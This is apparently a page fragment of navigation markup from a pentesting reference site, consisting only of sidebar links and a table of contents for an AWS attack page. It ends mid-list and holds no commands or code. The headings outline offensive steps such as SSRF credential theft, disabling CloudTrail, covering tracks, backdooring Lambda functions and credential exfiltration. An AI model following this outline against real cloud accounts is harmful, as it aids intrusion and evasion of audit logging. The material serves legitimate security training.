        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
          Insecure Management Interface
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_21">
          <span class="md-nav__icon md-icon"></span>
          Insecure Management Interface
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
        Insecure Management Interface
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
      
      
      
        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
          Insecure Randomness
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_22">
          <span class="md-nav__icon md-icon"></span>
          Insecure Randomness
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Randomness/" class="md-nav__link">
        Insecure Randomness
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
      
      
      
        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
          Insecure Source Code Management
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_23">
          <span class="md-nav__icon md-icon"></span>
          Insecure Source Code Management
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
        Insecure Source Code Management
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
      
      
      
        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
          JSON Web Token
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_24">
          <span class="md-nav__icon md-icon"></span>
          JSON Web Token
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
        JWT - JSON Web Token
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
      
      
      
        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
          Java RMI
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_25">
          <span class="md-nav__icon md-icon"></span>
          Java RMI
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Java%20RMI/" class="md-nav__link">
        Java RMI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
      
      
      
        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
          Kubernetes
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_26">
          <span class="md-nav__icon md-icon"></span>
          Kubernetes
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/" class="md-nav__link">
        Kubernetes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
      
      
      
        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
          LDAP Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_27">
          <span class="md-nav__icon md-icon"></span>
          LDAP Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LDAP%20Injection/" class="md-nav__link">
        LDAP Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
      
      
      
        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
          LaTeX Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_28">
          <span class="md-nav__icon md-icon"></span>
          LaTeX Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LaTeX%20Injection/" class="md-nav__link">
        LaTex Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" checked>
      
      
      
        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
          Methodology and Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_29">
          <span class="md-nav__icon md-icon"></span>
          Methodology and Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Active%20Directory%20Attack/" class="md-nav__link">
        Active Directory Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
        Bind Shell
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Cloud - AWS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Cloud - AWS
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#training" class="md-nav__link">
    Training
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-patterns" class="md-nav__link">
    AWS Patterns
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-metadata-ssrf" class="md-nav__link">
    AWS - Metadata SSRF
  </a>
  
    <nav class="md-nav" aria-label="AWS - Metadata SSRF">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#method-for-elastic-cloud-compute-ec2" class="md-nav__link">
    Method for Elastic Cloud Compute (EC2)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#method-for-container-service-fargate" class="md-nav__link">
    Method for Container Service (Fargate)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aws-api-calls-that-return-credentials" class="md-nav__link">
    AWS API calls that return credentials
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-shadow-admin" class="md-nav__link">
    AWS - Shadow Admin
  </a>
  
    <nav class="md-nav" aria-label="AWS - Shadow Admin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#admin-equivalent-permission" class="md-nav__link">
    Admin equivalent permission
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-gaining-aws-console-access-via-api-keys" class="md-nav__link">
    AWS - Gaining AWS Console Access via API Keys
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-enumerate-iam-permissions" class="md-nav__link">
    AWS - Enumerate IAM permissions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-mount-ebs-volume-to-ec2-linux" class="md-nav__link">
    AWS - Mount EBS volume to EC2 Linux
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-copy-ec2-using-ami-image" class="md-nav__link">
    AWS - Copy EC2 using AMI Image
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-instance-connect-push-an-ssh-key-to-ec2-instance" class="md-nav__link">
    AWS - Instance Connect - Push an SSH key to EC2 instance
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-lambda-extract-functions-code" class="md-nav__link">
    AWS - Lambda - Extract function's code
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-ssm-command-execution" class="md-nav__link">
    AWS - SSM - Command execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-golden-saml-attack" class="md-nav__link">
    AWS - Golden SAML Attack
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-shadow-copy-attack" class="md-nav__link">
    AWS - Shadow Copy attack
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#disable-cloudtrail" class="md-nav__link">
    Disable CloudTrail
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty" class="md-nav__link">
    Cover tracks by obfuscating Cloudtrail logs and Guard Duty
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamodb" class="md-nav__link">
    DynamoDB
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#security-checks" class="md-nav__link">
    Security checks
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#awsome-pentesting-cheatsheet" class="md-nav__link">
    AWSome Pentesting Cheatsheet
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#searching-for-open-buckets" class="md-nav__link">
    Searching for open buckets
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#arn" class="md-nav__link">
    ARN
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#iam" class="md-nav__link">
    IAM
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#configure-aws-cli" class="md-nav__link">
    Configure AWS cli
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#listing-iam-access-keys" class="md-nav__link">
    Listing IAM access Keys
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-enumerating-iam-users" class="md-nav__link">
    1. Enumerating IAM users
  </a>
  
    <nav class="md-nav" aria-label="1. Enumerating IAM users">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-credentials-for-the-user" class="md-nav__link">
    Checking credentials for the user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-iam-users" class="md-nav__link">
    Listing IAM Users
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-the-iam-groups-that-the-specified-iam-user-belongs-to" class="md-nav__link">
    Listing the IAM groups that the specified IAM user belongs to
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-manages-policies-that-are-attached-to-the-specified-iam-user" class="md-nav__link">
    Listing all manages policies that are attached to the specified IAM user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-user" class="md-nav__link">
    Listing the names of the inline policies embedded in the specified IAM user
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-enumerating-groups-iam" class="md-nav__link">
    2. Enumerating Groups IAM
  </a>
  
    <nav class="md-nav" aria-label="2. Enumerating Groups IAM">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-iam-groups" class="md-nav__link">
    Listing IAM Groups
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-managed-policies-that-are-attached-to-the-specified-iam-group" class="md-nav__link">
    Listing all managed policies that are attached to the specified IAM Group
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-group" class="md-nav__link">
    Listing the names of the inline policies embedded in the specified IAM Group
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-enumeratig-roles" class="md-nav__link">
    3. Enumeratig Roles
  </a>
  
    <nav class="md-nav" aria-label="3. Enumeratig Roles">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-iam-roles" class="md-nav__link">
    Listing IAM Roles
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listsing-all-managed-policies-that-are-attached-to-the-specified-iam-role" class="md-nav__link">
    Listsing all managed policies that are attached to the specified IAM role
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-role" class="md-nav__link">
    Listing the names of the inline policies embedded in the specified IAM role
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-enumerating-policies" class="md-nav__link">
    4. Enumerating Policies
  </a>
  
    <nav class="md-nav" aria-label="4. Enumerating Policies">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-of-iam-policies" class="md-nav__link">
    Listing of IAM Policies
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-information-about-the-specified-managed-policy" class="md-nav__link">
    Retrieving information about the specified managed policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-the-versions-of-the-specified-manages-policy" class="md-nav__link">
    Listing information about the versions of the specified manages policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-information-about-the-specific-version-of-the-specified-managed-policy" class="md-nav__link">
    Retrieving information about the specific version of the specified managed policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-the-specified-inline-policy-document-that-is-embedded-on-the-specified-iam-user-group-role" class="md-nav__link">
    Retrieving the specified inline policy document that is embedded on the specified IAM user / group / role
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-exploitation-scenario" class="md-nav__link">
    5. Exploitation Scenario
  </a>
  
    <nav class="md-nav" aria-label="5. Exploitation Scenario">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-guidelines" class="md-nav__link">
    General Guidelines
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-the-owner-of-the-key-and-initial-compromise" class="md-nav__link">
    Enumerating the owner of the key and initial compromise
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#study-case" class="md-nav__link">
    Study Case
  </a>
  
    <nav class="md-nav" aria-label="Study Case">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attaching-this-policy-into-our-user" class="md-nav__link">
    Attaching this policy into our user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-inline-policies-of-our-user" class="md-nav__link">
    Listing inline policies of our user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-a-restricted-resource-example-s3" class="md-nav__link">
    Listing a restricted resource (Example S3)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-permissions" class="md-nav__link">
    Interesting Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-backdooring" class="md-nav__link">
    Persistence &amp; Backdooring
  </a>
  
    <nav class="md-nav" aria-label="Persistence &amp; Backdooring">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#creating-a-new-access-key-for-another-user" class="md-nav__link">
    Creating a new access key for another user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configuring-aws-cli-for-the-new-user" class="md-nav__link">
    Configuring AWS cli for the new user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#testing-the-credential" class="md-nav__link">
    Testing the credential
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#accessing-more-credentials" class="md-nav__link">
    Accessing more credentials
  </a>
  
    <nav class="md-nav" aria-label="Accessing more credentials">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-managed-policies-attached-to-an-user" class="md-nav__link">
    Listing managed policies attached to an user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-information-about-an-specific-policy" class="md-nav__link">
    Retrieving information about an specific policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-the-version-of-the-policy" class="md-nav__link">
    Listing information about the version of the policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-information-about-an-specific-version" class="md-nav__link">
    Retrieving information about an specific version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-iam-roles_1" class="md-nav__link">
    Listing IAM roles
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-trust-relashionship-between-role-and-user-which-roles-we-can-assume" class="md-nav__link">
    Listing trust relashionship between role and user (Which roles we can assume)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-managed-policies-attached-to-the-specific-iam-role" class="md-nav__link">
    Listing all managed policies attached to the specific IAM role
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-information-about-the-specified-version-of-the-policy" class="md-nav__link">
    Retrieving information about the specified version of the policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-temporary-credentials-for-the-role" class="md-nav__link">
    Getting temporary credentials for the role
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configuring-aws-cli-with-newer-credentials-on-linux" class="md-nav__link">
    Configuring AWS cli with newer credentials (On Linux)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-the-temporary-credential" class="md-nav__link">
    Getting information about the temporary credential
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#s3-simple-storage-system" class="md-nav__link">
    S3 - Simple Storage System
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-all-buckets-in-aws-account" class="md-nav__link">
    Listing all buckets in aws account
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-a-specific-bucket" class="md-nav__link">
    Getting information about a specific bucket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-a-specific-bucket-policy" class="md-nav__link">
    Getting information about a specific bucket policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-the-public-access-block-configuration-for-an-s3-bucket" class="md-nav__link">
    Getting the Public Access Block configuration for an S3 bucket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-objects-in-a-specific-bucket" class="md-nav__link">
    Listing all objects in a specific bucket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-acl-information-about-specific-object" class="md-nav__link">
    Getting ACL information about specific object
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-exfiltration" class="md-nav__link">
    Data Exfiltration
  </a>
  
    <nav class="md-nav" aria-label="Data Exfiltration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#public-access" class="md-nav__link">
    Public Access
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#authenticated-user" class="md-nav__link">
    Authenticated User
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#time-based-url" class="md-nav__link">
    Time-Based Url
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lambda-api-gateway" class="md-nav__link">
    Lambda &amp; API Gateway
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-all-lambda-functions" class="md-nav__link">
    Listing All lambda functions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-lambda-function" class="md-nav__link">
    Listing information about a specific lambda function
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-policy-information-about-the-function" class="md-nav__link">
    Listing policy information about the function
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-the-event-source-mapping-information-about-a-lambda-function" class="md-nav__link">
    Listing the event source mapping information about a lambda function
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-lambda-layers-depedencies" class="md-nav__link">
    Listing Lambda Layers (Depedencies)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-full-information-about-a-lambda-layer" class="md-nav__link">
    Listing full information about a lambda layer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-rest-apis" class="md-nav__link">
    Listing Rest API'S
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-api" class="md-nav__link">
    Listing information about a specific API
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-endpoints" class="md-nav__link">
    Listing information about endpoints
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-endpoint" class="md-nav__link">
    Listing information about a specific endpoint
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-method-information-for-the-endpoint" class="md-nav__link">
    Listing method information for the endpoint
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-versions-of-a-rest-api" class="md-nav__link">
    Listing all versions of a rest api
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-informatin-about-a-specific-version" class="md-nav__link">
    Getting informatin about a specific version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-api-keys" class="md-nav__link">
    Listing API KEYS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-a-specific-api-key" class="md-nav__link">
    Getting information about a specific API Key
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    Initial Access
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#credential-access" class="md-nav__link">
    Credential Access
  </a>
  
    <nav class="md-nav" aria-label="Credential Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#getting-credentials-using-rce" class="md-nav__link">
    Getting credentials using RCE
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-credentials-using-ssrf" class="md-nav__link">
    Getting credentials using SSRF
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-credentials-using-ssrf-and-wrappers" class="md-nav__link">
    Getting credentials using SSRF and wrappers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-credentials-from-lambda-enviroment-variables-cli" class="md-nav__link">
    Getting credentials from lambda enviroment variables (cli)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#persistence" class="md-nav__link">
    Persistence
  </a>
  
    <nav class="md-nav" aria-label="Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-which-user-is-executing" class="md-nav__link">
    Checking which user is executing
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-all-managed-policies-attached-to-the-user" class="md-nav__link">
    Checking all managed policies attached to the user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-informations-about-a-specific-policy" class="md-nav__link">
    Checking informations about a specific policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-lambda-functions_1" class="md-nav__link">
    Listing all lambda functions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-the-specified-lambda" class="md-nav__link">
    Listing information about the specified lambda
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-policy-information-about-the-specific-lambda-function" class="md-nav__link">
    Listing policy information about the specific lambda function
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-rest-apis_1" class="md-nav__link">
    Listing Rest API'S
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-api_1" class="md-nav__link">
    Listing information about a specific API
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-endpoints_1" class="md-nav__link">
    Listing information about endpoints
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-endpoint_1" class="md-nav__link">
    Listing information about a specific endpoint
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-method-information-for-the-endpoint_1" class="md-nav__link">
    Listing method information for the endpoint
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-versions-of-a-rest-api_1" class="md-nav__link">
    Listing all versions of a rest api
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-informatin-about-a-specific-version_1" class="md-nav__link">
    Getting informatin about a specific version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-the-backdoor-code-to-aws-lambda-function" class="md-nav__link">
    Uploading the backdoor code to aws lambda function
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-the-function" class="md-nav__link">
    Invoke the Function
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation_1" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-a-lambda-function-and-attach-a-role-to-it" class="md-nav__link">
    Create a lambda function and attach a role to it
  </a>
  
    <nav class="md-nav" aria-label="Create a lambda function and attach a role to it">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-code-to-add-the-permissions" class="md-nav__link">
    Example code to add the permissions
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-a-lambda-function" class="md-nav__link">
    Invoke a lambda function
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-managed-policies-to-see-if-the-change-worked" class="md-nav__link">
    Listing managed policies to see if the change worked
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws-secret-manager" class="md-nav__link">
    AWS Secret Manager
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-all-secrets-stored-by-secret-manager" class="md-nav__link">
    Listing all secrets stored by Secret Manager
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-secret" class="md-nav__link">
    Listing information about a specific secret
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-policies-attached-to-the-specified-secret" class="md-nav__link">
    Getting policies attached to the specified secret
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-keys-in-kms" class="md-nav__link">
    Listing keys in KMS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-key" class="md-nav__link">
    Listing information about a specific key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-policies-attached-to-a-specific-key" class="md-nav__link">
    Listing policies attached to a specific key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-full-information-about-a-policy" class="md-nav__link">
    Getting full information about a policy
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#credential-exfiltration" class="md-nav__link">
    Credential Exfiltration
  </a>
  
    <nav class="md-nav" aria-label="Credential Exfiltration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-policies-attached-to-an-user" class="md-nav__link">
    Listing policies attached to an user
  </a>
  
</li>
        
          <li class="md-nav__item">
